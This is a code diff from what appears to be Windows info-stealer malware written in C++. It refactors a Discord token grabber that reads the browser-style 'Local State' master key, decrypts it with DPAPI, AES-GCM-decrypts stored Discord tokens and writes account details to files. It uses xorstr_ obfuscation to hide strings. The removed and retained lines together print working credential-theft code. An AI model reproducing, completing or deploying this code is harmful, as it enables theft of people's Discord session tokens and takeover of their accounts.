@@ -52,57 +52,6 @@ void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
     Utils::writeFile(root / (std::string(resp["username"]) + ".txt"), ss.str());
 }
 
-static const std::string base64_chars =
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        "abcdefghijklmnopqrstuvwxyz"
-        "0123456789+/";
-
-
-static inline bool is_base64(BYTE c) {
-    return (isalnum(c) || (c == '+') || (c == '/'));
-}
-
-std::vector<BYTE> base64Decode(const std::string& input) {
-    size_t in_len = input.size();
-    int i = 0;
-    int j = 0;
-    int in_ = 0;
-    BYTE char_array_4[4], char_array_3[3];
-    std::vector<BYTE> ret;
-
-    while (in_len-- && ( input[in_] != '=') && is_base64(input[in_])) {
-        char_array_4[i++] = input[in_]; in_++;
-        if (i ==4) {
-            for (i = 0; i <4; i++)
-                char_array_4[i] = base64_chars.find(char_array_4[i]);
-
-            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-
-            for (i = 0; (i < 3); i++)
-                ret.push_back(char_array_3[i]);
-            i = 0;
-        }
-    }
-
-    if (i) {
-        for (j = i; j <4; j++)
-            char_array_4[j] = 0;
-
-        for (j = 0; j <4; j++)
-            char_array_4[j] = base64_chars.find(char_array_4[j]);
-
-        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-
-        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
-    }
-
-    return ret;
-}
-
 std::vector<std::string> Discord::getTokens() {
     std::vector<std::string> tokens;
 
@@ -129,42 +78,12 @@ std::vector<std::string> Discord::getToken(fs::path &root) {
     if(!exists(root))
         return {};
 
-    std::vector<BYTE> masterKey = Discord::getMaterKey(root);
+    std::vector<BYTE> masterKey = ChromuimUtil::getMasterKey(root);
     if(masterKey.empty())
         return {};
 
 
     return this->scanToken(root, masterKey);
-}
-
-std::vector<BYTE> Discord::getMaterKey(fs::path &root) {
-    if(!exists(root))
-        return {};
-
-    std::string masterKey;
-    try
-    {
-        fs::path localStatePath = root / xorstr_("Local State");
-
-        if(!exists(localStatePath))
-            return {};
-
-        std::string content = Utils::readFile(localStatePath);
-        if(content.empty())
-            return {};
-
-        json jsonObject = json::parse(content);
-        masterKey = jsonObject[xorstr_("os_crypt")][xorstr_("encrypted_key")];
-    }
-    catch (const std::exception& e)
-    {
-        return {};
-    }
-
-    std::vector<BYTE> decoded_key = base64Decode(masterKey);
-    decoded_key.erase(decoded_key.begin(), decoded_key.begin() + 5);
-
-    return decoded_key;
 }
 
 std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BYTE>& master_key) {
@@ -199,9 +118,9 @@ std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BY
                     }
 
                     unformatted_token = unformatted_token.substr(unformatted_token.find("dQw4w9WgXcQ:") + 12);
-                    std::vector<BYTE> decoded_token(base64Decode(unformatted_token));
+                    std::vector<BYTE> decoded_token(Base64Util::b64decode(unformatted_token));
 
-                    std::string decryptedToken = decrypt(decoded_token, master_key);
+                    std::string decryptedToken = ChromuimUtil::decryptData(decoded_token, master_key);
                     tokens.push_back(decryptedToken);
 
                     line = match.suffix().str();
@@ -211,55 +130,4 @@ std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BY
     }
 
     return tokens;
-}
-
-std::vector<unsigned char> CryptUnprotectDataWrapper(const std::vector<unsigned char> &data) {
-    DATA_BLOB inData, outData;
-    inData.pbData = const_cast<BYTE*>(data.data());
-    inData.cbData = static_cast<DWORD>(data.size());
-
-    if (CryptUnprotectData(&inData, NULL, NULL, NULL, NULL, 0, &outData)) {
-        std::vector<unsigned char> result(outData.pbData, outData.pbData + outData.cbData);
-        LocalFree(outData.pbData);
-        return result;
-    } else {
-        return {};
-    }
-}
-
-std::string Discord::decrypt(const std::vector<unsigned char> &buffer, const std::vector<unsigned char> &master_key) {
-    auto decrypted_key = CryptUnprotectDataWrapper(master_key);
-    std::vector<unsigned char> iv(buffer.begin() + 3, buffer.begin() + 15);
-    std::vector<unsigned char> ciphertext(buffer.begin() + 15, buffer.end() - 16);
-
-    BCRYPT_ALG_HANDLE hAlg = nullptr;
-    BCRYPT_KEY_HANDLE hKey = nullptr;
-    NTSTATUS status;
-
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
-    if (status != 0) return "";
-
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-    if (status != 0) return "";
-
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, decrypted_key.data(), static_cast<ULONG>(decrypted_key.size()), 0);
-    if (status != 0) return "";
-
-    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
-    authInfo.pbNonce = iv.data();
-    authInfo.cbNonce = static_cast<ULONG>(iv.size());
-    authInfo.pbTag = const_cast<BYTE*>(buffer.data() + buffer.size() - 16);
-    authInfo.cbTag = 16;
-
-    std::vector<unsigned char> decrypted(ciphertext.size());
-    ULONG decryptedSize = 0;
-
-    status = BCryptDecrypt(hKey, ciphertext.data(), static_cast<ULONG>(ciphertext.size()), &authInfo, nullptr, 0, decrypted.data(), static_cast<ULONG>(decrypted.size()), &decryptedSize, 0);
-    if (status != 0) return "";
-
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
-
-    return std::string(decrypted.begin(), decrypted.begin() + decryptedSize);
 }
